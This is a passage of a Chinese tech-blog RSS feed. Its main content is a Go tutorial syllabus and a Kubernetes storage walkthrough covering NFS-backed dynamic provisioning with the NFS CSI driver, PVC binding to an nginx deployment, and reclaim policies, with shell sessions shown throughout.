事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:54:01 +0000</pubDate>
    </item>
    <item>
      <title>《15分钟轻松学Go》教程目录</title>
      <link>https://www.ppmy.cn/news/1540426.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维《15分钟轻松学Go》教程目录news/2025/10/31 17:54:00/在AI快速发展的时代，学习Go语言依然很有用。Go语言擅长处理高并发任务，也就是说可以同时处理很多请求，这对于需要快速响应的AI服务非常重要。另外，Go适合用来处理和传输大量数据，非常适合机器学习模型的数据预处理。Go还可以和其他更常用的AI语言（如Python）配合使用，这使得建立AI系统变得更加灵活。总之，Go在构建和部署AI应用中具有很强的优势，是一个值得学习的语言。此教程针对于小伙伴利用碎片化时间想快速掌握Go，满足Go的日常开发或入门Go语言是非常不错的选择。快快收藏此专栏，接下来每天都会有更新哦！15分钟学Go目录15分钟学Go第1天：Go语言简介、特点15分钟学Go第2天：安装Go环境15分钟学Go第3天：第一个Go程序15分钟学Go项目实践： 命令行工具15分钟学Go第4天：基本语法15分钟学Go第5天：数据类型15分钟学Go第6天：变量和常量15分钟学Go第7天：控制结构：条件语句15分钟学Go第8天：控制结构：循环15分钟学Go第9天：函数的定义与调用15分钟学Go第10天：函数参数和返回值15分钟学Go第11天：变量作用域15分钟学Go第12天：指针基础15分钟学Go第13天：数组15分钟学Go第14天：切片15分钟学Go第15天：映射15分钟学Go第16天：结构体15分钟学Go第17天：结构体方法15分钟学Go第18天：接口15分钟学Go第19天：接口的实现15分钟学Go第20天：Go的错误处理15分钟学Go第21天：标准库使用15分钟学Go第22天：包的使用15分钟学Go第23天：并发基础：Goroutines15分钟学Go项目实践： Web API15分钟学Go第24天：并发基础：Channels15分钟学Go第25天：使用WaitGroup15分钟学Go第26天：基本的Web服务15分钟学Go第27天：路由和处理请求15分钟学Go第28天：JSON处理15分钟学Go第29天：流程控制：select语句15分钟学Go第30天：测试基础15分钟学Go第31天：单元测试15分钟学Go第32天：基本调试技巧15分钟学Go第33天：项目结构15分钟学Go第34天：依赖管理：Go Modules15分钟学Go第35天：Go的性能调优15分钟学Go第36天：反射基础15分钟学Go第37天：综合复习与小项目15分钟学Go第38天：数据库基础15分钟学Go第39天：SQL操作15分钟学Go第40天：使用ORM库15分钟学Go项目实践：博客系统15分钟学Go第41天：中间件的使用15分钟学Go第42天：Restful API设计15分钟学Go第43天：前端与Go的结合15分钟学Go第44天：项目部署基础15分钟学Go第45天：使用Docker容器15分钟学Go项目实践：实时聊天室15分钟学Go第46天：监控与日志15分钟学Go第47天：并发进阶15分钟学Go第48天：性能测试15分钟学Go第49天：复杂项目开发15分钟学Go第50天：项目优化与重构15分钟学Go项目实践：任务调度器15分钟学Go第51天：通用库与工具使用15分钟学Go第52天：发布与版本控制15分钟学Go第53天：社区资源与学习材料15分钟学Go第54天：项目总结与经验分享15分钟学Go项目实践：简单的电子商务网站15分钟学Go第55天：代码审核与反馈15分钟学Go第56天：架构设计基本原则15分钟学Go第57天：持续集成与持续部署15分钟学Go第58天：复习与总结15分钟学Go项目实践：数据爬虫15分钟学Go第59天：更高级的Go话题15分钟学Go第60天：综合项目展示15分钟学Go项目实践：统计分析工具哈哈，都看到这儿了，还请关注GZH，我会定期分享最新的AI知识和编程动向：http://www.ppmy.cn/news/1540426.html相关文章Linux——K8S的pod的调度DeploymentStatefulSetDaemonsetreplicaSetReplicacontroller     // 从K8S的近期版本中将逐渐移除rcJobcronjob 
K8s 网络&amp;#xff1a; 
平台中的POD如何通信&amp;#xff1a; CNI 容器网络插件Coredns的组件 负责提供平台中的名称解析平台中的应用如何被客户端访问 Service // 将…阅读更多...【基础篇】AOF日志：宕机了，Redis如何避免数据丢失？背景 
如果有人问你&amp;#xff1a;“你会把 Redis 用在什么业务场景下&amp;#xff1f;”我想你大概率会说&amp;#xff1a;“我会把它当作缓存使用&amp;#xff0c;因为它把后端数据库中的数据存储在内存中&amp;#xff0c;然后直接从内存中读取数据&amp;#xff0c;响应速度会非常快。”没错&amp;#x…阅读更多...你的电脑能不能安装windows 11，用这个软件检测下就知道了为了应对Windows 11的推出&amp;#xff0c;一款名为WhyNotWin11的创新型诊断软件应运而生。这个强大的工具不仅仅是一个简单的兼容性检测器&amp;#xff0c;它更像是一位细心的数字医生&amp;#xff0c;全方位评估您的计算机是否准备好迎接微软最新操作系统的挑战。 
WhyNotWin11的功能远超…阅读更多...代码复现（五）：GCPANet文章目录 net.py1.class Bottleneck&amp;#xff1a;残差块2.class ResNet&amp;#xff1a;特征提取3.class SRM&amp;#xff1a;SR模块4.class FAM&amp;#xff1a;FIA模块5.class CA&amp;#xff1a;GCF模块6.class SA&amp;#xff1a;HA模块7.class GCPANet&amp;#xff1a;网络架构 train.pytest.py 论文…阅读更多...基于SSM+微信小程序的实验室设备故障报修管理系统2&amp;#x1f449;文末查看项目功能视频演示获取源码sql脚本视频导入教程视频 
1、项目介绍 
基于SSM微信小程序的实验室设备故障报修管理系统2实现了管理员&amp;#xff0c;用户&amp;#xff0c;维修员三个角色。 
管理员功能有 个人中心&amp;#xff0c;用户管理&amp;#xff0c;维修员管理&amp;#…阅读更多...YOLO模型在不同光照条件下的检测性能如何优化？域自适应方法&amp;#xff1a;通过合并多个预训练模型&amp;#xff0c;并结合生成模型来适应新的可视化任务&amp;#xff0c;无需创建额外的数据集。例如&amp;#xff0c;YOLO-in-the-Dark模型就是将预先训练好的模型与生成模型相结合&amp;#xff0c;在不增加数据集的情况下&amp;#xff0c;通过粘合层…阅读更多...QT QML 练习1这个代码是使用 QtQuick 框架编写的一个简单的 GUI 应用程序&amp;#xff0c;创建了一个窗口&amp;#xff0c;其中包含了一个背景图像、一个风车杆&amp;#xff08;pole&amp;#xff09;&amp;#xff0c;以及一个可以点击旋转的风车&amp;#xff08;pinwheel&amp;#xff09;。以下是对实现的详细介绍及其特…阅读更多...微信小程序上传组件封装uploadHelper2.0使用整理一、uploadHelper2.0使用步骤说明 
uploadHelper.js ---上传代码封装库 
cos-wx-sdk-v5.min.js---腾讯云&amp;#xff0c;对象存储封装库 
第一步&amp;#xff0c;下载组件代码&amp;#xff0c;放置到自己的小程序项目中 第二步、 创建上传对象&amp;#xff0c;执行选择图片/视频 var _this  th…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:54:00 +0000</pubDate>
    </item>
    <item>
      <title>Linux——K8S的pod的调度</title>
      <link>https://www.ppmy.cn/news/1540425.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Linux——K8S的pod的调度news/2025/10/31 17:53:59/DeploymentStatefulSetDaemonsetreplicaSetReplicacontroller     // 从K8S的近期版本中将逐渐移除rcJobcronjobK8s 网络：平台中的POD如何通信：CNI 容器网络插件Coredns的组件 负责提供平台中的名称解析平台中的应用如何被客户端访问Service // 将部署的应用暴露给一个统一的入口ClusterIP // 平台内部IP地址NodePort // 节点的端口   从30000以上的端口中随机选择一个端口来暴露服务对应的pod，可以从K8S集群的任意节点IP加端口号 访问服务ExternalIP // 外部IP 需要管理员手动分配一个既不属于节点IP所在网段，也不属于集群IP地址段，也不能POD地址段重复的公网IP地址Loadbalance  // 负载均衡    通过公有云服务上提供的负载均衡服务来实现对于pod的访问Ingress // 应用层路由     ingress controller应用网关 // kong nginx等    应用层路由K8S 存储：任何容器在运行时，都需要获取一定的存储空间来存储容器所使用的镜像数据，以及容器的copy-on-write技术，对镜像层数据进行修改使用卷这个抽象概念来定义容器所需要使用的存储在k8s平台中卷是对应pod的概念卷使用属性：临时卷 // 伴随pod的生命周期，动态制备，在未指定存储驱动的情况下。直接使用pod所在节点的文件系统创建emptydir解决持久卷 // 可以通过持久卷配置对于pod的存储、以及在pod被移除的时候，仅仅卸载卷，而不删除卷的数据  持久卷不是通过卷名来映射并挂在到容器，一般需要引入一个PVC  实现pvc-pv的对应关系，而容器的mount中只需要说明pvc的名称和挂载点从卷存储驱动角度：简单的说就是卷中的数据会被存储到那个地方节点上本地文件系统、逻辑卷、块设备、分区：Hostpath // 指定的路径必须已经在工作节点上存在Empdir // empty 一般会在pod删除时，清空数据Local // 不支持动态制备基于一些网络文件共享服务： // 需要预先设置好，对应服务的服务端，并在客户端，也就是K8S的节点上，预先配置好客户端的环境NfsIscsi基于公有云的云存储服务，所提供的存储驱动：下面列出了常见的公有云厂商AwsAzureVshpere基于常规云存储服务：Cinder // openstack的一个组件，用来提供块存储服务基于常规的分布式存储解决方案：CephGlusterfs直接将已有的文件|数据（可以在本地，也可以保存在某个网上的地址）制备成卷，然后挂载到pod中   //需要注意卷的更新是否及时同步到容器中Config-mapSecretdownloadAPIGitreposCSI   // 容器的存储接口存储类 ： 提供卷的存储引擎  卷的存储空间来自哪里？K8S 平台中支持同时创建多个存储类，同时只能有一个存储类是默认的存储类持久卷的使用步骤:PV制备静态制备Pv 生命周期和pvc 不绑定。删除pvc 不会删除pv 但是直接删除PV ，PVC 的状态从bind （绑定）转为 未绑定动态制备不是所有的存储类都支持动态制备，需要参考指定存储类的文档动态制备免去手动创建和pvc 申领PV的过程，在动态制备的过程中，只需要创建的PVC ，PVC会主动向 指定的存储类请求符合大小、读写限制等属性的PV，存储类完成PV创建，PVC 绑定PV一般动态制备的卷，在移除pvc 时，自动移除对应的PVPvc 绑定PV基于PVC 声明的大小和操作模式属性进行匹配，符合条件的PV 将自动绑定到PVCPvc 和 pv 之间的绑定关系具备排他性如果PVC 没有匹配到符合条件的PV ，那么PVC 会一直处于未绑定状态Pod 声明使用指定的PVCPod的volumes的属性下，规定persistentVolumeClaim来使用PVCPvc 如果已经绑定到pod中，那么PVC 不会被删除，只有在pod移除后，平台才会将PVC删除回收：如果pod 不在需要使用额外的存储卷，那么可以直接修改pod的配置，删除PVC使用的段落，此时可以删除PVCPvc 绑定的PV 是否需要删除，取决于创建PV时设定的回收策略Retained（保留数据）、Recycled（回收在重新使用之前，清空数据）或 Deleted（删除绑定的PVC删除后，也会删除PV）使用nfs 存储引擎，制备PV：设置一个nfs的共享动态制备PV首先安装nfs-csi-driver创建新的存储类Nfs的共享声明挂载选项直接创建PVC在某个pod中使用PVC使用node1 作为nfs的服务端，为了避免使用本身根文件系统，建议新增一块硬盘，格式化后挂载到nfs的共享目录下：Node1:
[root@node1 ~]# lsblk
NAME              MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
sr0                11:0    1 10.5G  0 rom
nvme0n1           259:0    0   50G  0 disk
├─nvme0n1p1       259:1    0  600M  0 part /boot/efi
├─nvme0n1p2       259:2    0    1G  0 part /boot
└─nvme0n1p3       259:3    0 48.4G  0 part├─cs_bogon-root 253:0    0 44.5G  0 lvm  /└─cs_bogon-swap 253:1    0  3.9G  0 lvm
nvme0n2           259:4    0   50G  0 disk		// 新增硬盘
[root@node1 ~]# vgcreate  nfs-group /dev/nvme0n2Volume group "nfs-group" successfully created
[root@node1 ~]# vgsVG        #PV #LV #SN Attr   VSize   VFreecs_bogon    1   2   0 wz--n-  48.41g      0nfs-group   1   0   0 wz--n- &lt;50.00g &lt;50.00g
[root@node1 ~]# lvcreate -l +100%FREE -n nfs-server  nfs-group
WARNING: xfs signature detected on /dev/nfs-group/nfs-server at offset 0. Wipe it? [y/n]: yWiping xfs signature on /dev/nfs-group/nfs-server.Logical volume "nfs-server" created.
[root@node1 ~]# lvsLV         VG        Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convertroot       cs_bogon  -wi-ao----  44.49gswap       cs_bogon  -wi-a-----  &lt;3.92gnfs-server nfs-group -wi-a----- &lt;50.00g
[root@node1 ~]# vgsVG        #PV #LV #SN Attr   VSize   VFreecs_bogon    1   2   0 wz--n-  48.41g    0nfs-group   1   1   0 wz--n- &lt;50.00g    0
[root@node1 ~]# mkfs.xfs /dev/nfs-group/nfs-server
meta-data=/dev/nfs-group/nfs-server isize=512    agcount=4, agsize=3276544 blks=                       sectsz=512   attr=2, projid32bit=1=                       crc=1        finobt=1, sparse=1, rmapbt=0=                       reflink=1    bigtime=1 inobtcount=1 nrext64=0
data     =                       bsize=4096   blocks=13106176, imaxpct=25=                       sunit=0      swidth=0 blks
naming   =version 2              bsize=4096   ascii-ci=0, ftype=1
log      =internal log           bsize=4096   blocks=16384, version=2=                       sectsz=512   sunit=0 blks, lazy-count=1
realtime =none                   extsz=4096   blocks=0, rtextents=0
[root@node1 ~]# mkdir /nfs-share
[root@node1 ~]# mount -t xfs /dev/nfs-group/nfs-server /nfs-share/
[root@node1 ~]# df | grep nfs
/dev/mapper/nfs--group-nfs--server  52359168   398104  51961064   1% /nfs-share[root@node1 ~]# yum -y install nfs-utils
[root@node1 ~]# vim /etc/exports
[root@node1 ~]# cat /etc/exports
/nfs-share      192.168.110.0/24(rw,sync,no_root_squash)
[root@node1 ~]# systemctl start nfs-server
[root@node1 ~]# vim /etc/fstab
[root@node1 ~]# tail -1 /etc/fstab
/dev/nfs-group/nfs-server       /nfs-share      xfs     defaults        0 0 // 末尾新增
[root@node1 ~]# showmount -e localhost
Export list for localhost:
/nfs-share 192.168.110.0/24[root@control ~]# showmount -e node1
Export list for node1:
/nfs-share 192.168.110.0/24[root@node2 ~]# showmount -e node1
Export list for node1:
/nfs-share 192.168.110.0/242.安装nfs-csi-driver 到K8S 在control节点上进行// 下载nfs-csi-driver的安装包 并上传到control节点中
[root@control ~]# ls csi-driver-nfs-master.zip
csi-driver-nfs-master.zip
[root@control ~]# unzip csi-driver-nfs-master.zip
[root@control ~]# cd csi-driver-nfs-master/
[root@control csi-driver-nfs-master]# ls
CHANGELOG  cloudbuild.yaml  code-of-conduct.md  deploy      docs    go.sum  LICENSE   OWNERS          pkg        RELEASE.md     SECURITY_CONTACTS  test
charts     cmd              CONTRIBUTING.md     Dockerfile  go.mod  hack    Makefile  OWNERS_ALIASES  README.md  release-tools  support.md         vendor
[root@control csi-driver-nfs-master]# ls deploy/v4.6.0/
crd-csi-snapshot.yaml    csi-nfs-driverinfo.yaml  csi-snapshot-controller.yaml  rbac-snapshot-controller.yaml
csi-nfs-controller.yaml  csi-nfs-node.yaml        rbac-csi-nfs.yaml
# 查找部署nfs-csi-driver 需要使用那些镜像
[root@control csi-driver-nfs-master]# grep image  deploy/v4.6.0/*.yaml
deploy/v4.6.0/csi-nfs-controller.yaml:          image: registry.k8s.io/sig-storage/csi-provisioner:v4.0.0
deploy/v4.6.0/csi-nfs-controller.yaml:          image: registry.k8s.io/sig-storage/csi-snapshotter:v6.3.3
deploy/v4.6.0/csi-nfs-controller.yaml:          imagePullPolicy: IfNotPresent
deploy/v4.6.0/csi-nfs-controller.yaml:          image: registry.k8s.io/sig-storage/livenessprobe:v2.12.0
deploy/v4.6.0/csi-nfs-controller.yaml:          image: registry.k8s.io/sig-storage/nfsplugin:v4.6.0
deploy/v4.6.0/csi-nfs-controller.yaml:          imagePullPolicy: IfNotPresent
deploy/v4.6.0/csi-nfs-node.yaml:          image: registry.k8s.io/sig-storage/livenessprobe:v2.12.0
deploy/v4.6.0/csi-nfs-node.yaml:          image: registry.k8s.io/sig-storage/csi-node-driver-registrar:v2.10.0
deploy/v4.6.0/csi-nfs-node.yaml:          image: registry.k8s.io/sig-storage/nfsplugin:v4.6.0
deploy/v4.6.0/csi-nfs-node.yaml:          imagePullPolicy: "IfNotPresent"
deploy/v4.6.0/csi-snapshot-controller.yaml:          image: registry.k8s.io/sig-storage/snapshot-controller:v6.3.3# 替换为国内镜像站
[root@control csi-driver-nfs-master]# sed -i "s/registry\.k8s\.io\/sig-storage/registry.aliyuncs.com\/google_containers/g" deploy/v4.6.0/*.yaml
# aliyun 未提供nfsplugin镜像，修改为其他国内可用镜像站：
## 修改csi-nfs-controller.yaml 108行。关于nfsplugin镜像的行：
[root@control csi-driver-nfs-master]# head -108 deploy/v4.6.0/csi-nfs-controller.yaml | tail -1image: swr.cn-north-4.myhuaweicloud.com/ddn-k8s/registry.k8s.io/sig-storage/nfsplugin:v4.6.0
## 修改csi-nfs-node.yaml 96行。关于nfsplugin镜像的行：
[root@control csi-driver-nfs-master]# head -96 deploy/v4.6.0/csi-nfs-node.yaml | tail -1image: swr.cn-north-4.myhuaweicloud.com/ddn-k8s/registry.k8s.io/sig-storage/nfsplugin:v4.6.0# 安装nfs-csi-driver
## 直接使用提供的安装脚本，这个安装脚本将依次调用对应的yaml文件，创建nfs-csi-driver所需要的资源。
[root@control csi-driver-nfs-master]# ./deploy/install-driver.sh v4.6.0 local
use local deploy
Installing NFS CSI driver, version: v4.6.0 ...
serviceaccount/csi-nfs-controller-sa created
serviceaccount/csi-nfs-node-sa created
clusterrole.rbac.authorization.k8s.io/nfs-external-provisioner-role created
clusterrolebinding.rbac.authorization.k8s.io/nfs-csi-provisioner-binding created
csidriver.storage.k8s.io/nfs.csi.k8s.io created
deployment.apps/csi-nfs-controller created
daemonset.apps/csi-nfs-node created
NFS CSI driver installed successfully.
[root@control csi-driver-nfs-master]# kubectl -n kube-system get pod -o wide -l app=csi-nfs-controller
NAME                                  READY   STATUS    RESTARTS   AGE   IP               NODE    NOMINATED NODE   READINESS GATES
csi-nfs-controller-5778b77f88-9tcvb   4/4     Running   0          73s   192.168.110.11   node1   &lt;none&gt;           &lt;none&gt;
[root@control csi-driver-nfs-master]# kubectl -n kube-system get pod -o wide -l app=csi-nfs-node
NAME                 READY   STATUS    RESTARTS   AGE   IP               NODE      NOMINATED NODE   READINESS GATES
csi-nfs-node-jm9tw   3/3     Running   0          87s   192.168.110.11   node1     &lt;none&gt;           &lt;none&gt;
csi-nfs-node-pdc9x   3/3     Running   0          87s   192.168.110.10   control   &lt;none&gt;           &lt;none&gt;
csi-nfs-node-t25nx   3/3     Running   0          87s   192.168.110.22   node2     &lt;none&gt;           &lt;none&gt;#创建存储类
[root@control csi-driver-nfs-master]# cp deploy/storageclass.yaml ~
[root@control csi-driver-nfs-master]# cd
[root@control ~]# vim storageclass.yaml
[root@control ~]# cat storageclass.yaml
---
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:name: nfs-csiannotations:storageclass.kubernetes.io/is-default-class: "true"
provisioner: nfs.csi.k8s.io
parameters:server: node1share: /nfs-share# csi.storage.k8s.io/provisioner-secret is only needed for providing mountOptions in DeleteVolume# csi.storage.k8s.io/provisioner-secret-name: "mount-options"# csi.storage.k8s.io/provisioner-secret-namespace: "default"
reclaimPolicy: Delete
volumeBindingMode: Immediate
mountOptions:- nfsvers=4.1
[root@control ~]# kubectl get storageclasses
NAME                PROVISIONER                    RECLAIMPOLICY   VOLUMEBINDINGMODE      ALLOWVOLUMEEXPANSION   AGE
local-storage       kubernetes.io/no-provisioner   Delete          WaitForFirstConsumer   false                  20d
nfs-csi (default)   nfs.csi.k8s.io                 Delete          Immediate              false                  18h# 创建pvc[root@control ~]# cat nfs-csi-test.yml
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:name: pvc-nfs-dynamic
spec:accessModes:- ReadWriteManyresources:requests:storage: 1GistorageClassName: nfs-csi
[root@control ~]# kubectl apply -f nfs-csi-test.yml
persistentvolumeclaim/pvc-nfs-dynamic created
[root@control ~]# kubectl get pvc
NAME              STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS   VOLUMEATTRIBUTESCLASS   AGE
pvc-nfs-dynamic   Bound    pvc-394026c4-819a-4a68-8d56-7f70faba221b   1Gi        RWX            nfs-csi        &lt;unset&gt;                 3s
[root@control ~]# kubectl get pv
NAME                                       CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                     STORAGECLASS   VOLUMEATTRIBUTESCLASS   REASON   AGE
pvc-394026c4-819a-4a68-8d56-7f70faba221b   1Gi        RWX            Delete           Bound    default/pvc-nfs-dynamic   nfs-csi        &lt;unset&gt;                          14s# 创建服务挂载pv
[root@control ~]# cat test-nginx.yml
apiVersion: apps/v1
kind: Deployment
metadata:name: test-nginx
spec:selector:matchLabels:app: frontendreplicas: 3template:metadata:labels:app: frontendspec:containers:- name: test-nginximage: mynginx:new_filesimagePullPolicy: IfNotPresentports:- containerPort: 80volumeMounts:- name: nfsmountPath: /usr/share/nginx/htmlreadOnly: falsevolumes:- name: nfspersistentVolumeClaim:claimName: pvc-nfs-dynamic在nfs服务端，预先添加一些文件
[root@node1 ~]# ls /nfs-share/
pvc-394026c4-819a-4a68-8d56-7f70faba221b
[root@node1 ~]# ls /nfs-share/pvc-394026c4-819a-4a68-8d56-7f70faba221b/
[root@node1 ~]# echo "content save on nfsserver" &gt;&gt; /nfs-share/pvc-394026c4-819a-4a68-8d56-7f70faba221b/index.html[root@control ~]# vim test-nginx.yml
[root@control ~]# kubectl apply -f test-nginx.yml
deployment.apps/test-nginx created
[root@control ~]# kubectl get deployments.apps
NAME         READY   UP-TO-DATE   AVAILABLE   AGE
test-nginx   3/3     3            3           9s
[root@control ~]# kubectl expose deployment test-nginx
service/test-nginx exposed
[root@control ~]# kubectl get svc
NAME         TYPE        CLUSTER-IP    EXTERNAL-IP   PORT(S)   AGE
kubernetes   ClusterIP   10.96.0.1     &lt;none&gt;        443/TCP   17d
test-nginx   ClusterIP   10.96.18.20   &lt;none&gt;        80/TCP    7s
[root@control ~]# curl 10.96.18.20
content save on nfsserver
[root@control ~]# curl 10.96.18.20
content save on nfsserver
[root@control ~]# curl 10.96.18.20
content save on nfsserver# 删除pvc
[root@control ~]# kubectl delete -f nfs-csi-test.yml
persistentvolumeclaim "pvc-nfs-dynamic" deleted// 进程卡住，因为pvc 被pod使用中
## 打开新的终端，并删除使用pvc的pod即可
[root@control ~]# kubectl delete svc test-nginx
service "test-nginx" deleted
[root@control ~]# kubectl delete deployments.apps test-nginx
deployment.apps "test-nginx" deleted# 将动态卷的回收策略设置为retain (保留)
[root@control ~]# cat storageclass.yaml
---
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:name: nfs-csiannotations:storageclass.kubernetes.io/is-default-class: "true"
provisioner: nfs.csi.k8s.io
parameters:server: node1share: /nfs-share# csi.storage.k8s.io/provisioner-secret is only needed for providing mountOptions in DeleteVolume# csi.storage.k8s.io/provisioner-secret-name: "mount-options"# csi.storage.k8s.io/provisioner-secret-namespace: "default"
reclaimPolicy: Retain			// 修改这里
volumeBindingMode: Immediate
mountOptions:- nfsvers=4.1
[root@control ~]# kubectl delete -f storageclass.yaml
storageclass.storage.k8s.io "nfs-csi" deleted
[root@control ~]# kubectl apply -f storageclass.yaml
storageclass.storage.k8s.io/nfs-csi created
[root@control ~]# kubectl apply -f nfs-csi-test.yml
persistentvolumeclaim/pvc-nfs-dynamic created
[root@control ~]# kubectl get pvc
NAME              STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS   VOLUMEATTRIBUTESCLASS   AGE
pvc-nfs-dynamic   Bound    pvc-a1603ec6-4c0c-4c2b-a1a9-26b119fff8ce   1Gi        RWX            nfs-csi        &lt;unset&gt;                 7s
[root@control ~]# kubectl get pv
NAME                                       CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                     STORAGECLASS   VOLUMEATTRIBUTESCLASS   REASON   AGE
pvc-a1603ec6-4c0c-4c2b-a1a9-26b119fff8ce   1Gi        RWX            Retain           Bound    default/pvc-nfs-dynamic   nfs-csi        &lt;unset&gt;                          10s
[root@control ~]# kubectl delete pvc pvc-nfs-dynamic
persistentvolumeclaim "pvc-nfs-dynamic" deleted
[root@control ~]# kubectl get pv
NAME                                       CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS     CLAIM                     STORAGECLASS   VOLUMEATTRIBUTESCLASS   REASON   AGE
pvc-a1603ec6-4c0c-4c2b-a1a9-26b119fff8ce   1Gi        RWX            Retain           Released   default/pvc-nfs-dynamic   nfs-csi        &lt;unset&gt;                          42s# 删除pvc 绑定的pv 保留，在条件匹配的情况下，可以被继续使用http://www.ppmy.cn/news/1540425.html相关文章【基础篇】AOF日志：宕机了，Redis如何避免数据丢失？背景 
如果有人问你&amp;#xff1a;“你会把 Redis 用在什么业务场景下&amp;#xff1f;”我想你大概率会说&amp;#xff1a;“我会把它当作缓存使用&amp;#xff0c;因为它把后端数据库中的数据存储在内存中&amp;#xff0c;然后直接从内存中读取数据&amp;#xff0c;响应速度会非常快。”没错&amp;#x…阅读更多...你的电脑能不能安装windows 11，用这个软件检测下就知道了为了应对Windows 11的推出&amp;#xff0c;一款名为WhyNotWin11的创新型诊断软件应运而生。这个强大的工具不仅仅是一个简单的兼容性检测器&amp;#xff0c;它更像是一位细心的数字医生&amp;#xff0c;全方位评估您的计算机是否准备好迎接微软最新操作系统的挑战。 
WhyNotWin11的功能远超…阅读更多...代码复现（五）：GCPANet文章目录 net.py1.class Bottleneck&amp;#xff1a;残差块2.class ResNet&amp;#xff1a;特征提取3.class SRM&amp;#xff1a;SR模块4.class FAM&amp;#xff1a;FIA模块5.class CA&amp;#xff1a;GCF模块6.class SA&amp;#xff1a;HA模块7.class GCPANet&amp;#xff1a;网络架构 train.pytest.py 论文…阅读更多...基于SSM+微信小程序的实验室设备故障报修管理系统2&amp;#x1f449;文末查看项目功能视频演示获取源码sql脚本视频导入教程视频 
1、项目介绍 
基于SSM微信小程序的实验室设备故障报修管理系统2实现了管理员&amp;#xff0c;用户&amp;#xff0c;维修员三个角色。 
管理员功能有 个人中心&amp;#xff0c;用户管理&amp;#xff0c;维修员管理&amp;#…阅读更多...YOLO模型在不同光照条件下的检测性能如何优化？域自适应方法&amp;#xff1a;通过合并多个预训练模型&amp;#xff0c;并结合生成模型来适应新的可视化任务&amp;#xff0c;无需创建额外的数据集。例如&amp;#xff0c;YOLO-in-the-Dark模型就是将预先训练好的模型与生成模型相结合&amp;#xff0c;在不增加数据集的情况下&amp;#xff0c;通过粘合层…阅读更多...QT QML 练习1这个代码是使用 QtQuick 框架编写的一个简单的 GUI 应用程序&amp;#xff0c;创建了一个窗口&amp;#xff0c;其中包含了一个背景图像、一个风车杆&amp;#xff08;pole&amp;#xff09;&amp;#xff0c;以及一个可以点击旋转的风车&amp;#xff08;pinwheel&amp;#xff09;。以下是对实现的详细介绍及其特…阅读更多...微信小程序上传组件封装uploadHelper2.0使用整理一、uploadHelper2.0使用步骤说明 
uploadHelper.js ---上传代码封装库 
cos-wx-sdk-v5.min.js---腾讯云&amp;#xff0c;对象存储封装库 
第一步&amp;#xff0c;下载组件代码&amp;#xff0c;放置到自己的小程序项目中 第二步、 创建上传对象&amp;#xff0c;执行选择图片/视频 var _this  th…阅读更多...Python案例小练习——小计算器文章目录 前言一、代码展示二、运行展示 前言 
这是用python实现一个简单的计器。 一、代码展示 
def calculate(num1, op, num2):if op  "":return float(num1)  float(num2)elif op  "-":return float(num1) - float(num2)elif op  "*":return…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:59 +0000</pubDate>
    </item>
    <item>
      <title>【基础篇】AOF日志：宕机了，Redis如何避免数据丢失？</title>
      <link>https://www.ppmy.cn/news/1540424.html</link>
